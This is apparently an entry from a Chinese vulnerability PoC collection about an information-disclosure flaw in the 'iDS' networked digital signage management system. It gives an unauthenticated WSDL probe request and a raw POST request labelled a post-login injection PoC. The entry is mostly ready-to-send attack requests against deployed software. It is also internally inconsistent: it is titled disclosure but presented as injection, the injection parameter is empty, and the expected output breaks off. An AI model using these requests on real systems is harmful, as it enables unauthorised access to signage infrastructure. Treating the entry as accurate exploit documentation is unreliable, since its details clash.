# iDS联网数字标牌管理系统services存在信息泄露漏洞

- **系统**：iDS　|　**类型**：信息泄露　|　**CVE**：—
- **请求**：`GET /services/TaskLoad?wsdl HTTP/1.1`

**请求体 / payload**
```
后台注入POC：
POST /Pages/terminal!query HTTP/1.1
Host: 127.0.0.1
Content-Length: 229
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: 登陆后cookie
X-Requested-With: XMLHttpRequest
ascDesc=asc&hardware=true&orderBy=1&page.currentPage=1&page.pageSize=20&terminalparam.groupId=0&terminalparam.includeChildren=false&terminalparam.searchKey=
```
- **预期**：200　|　GetTaskDownLoadList: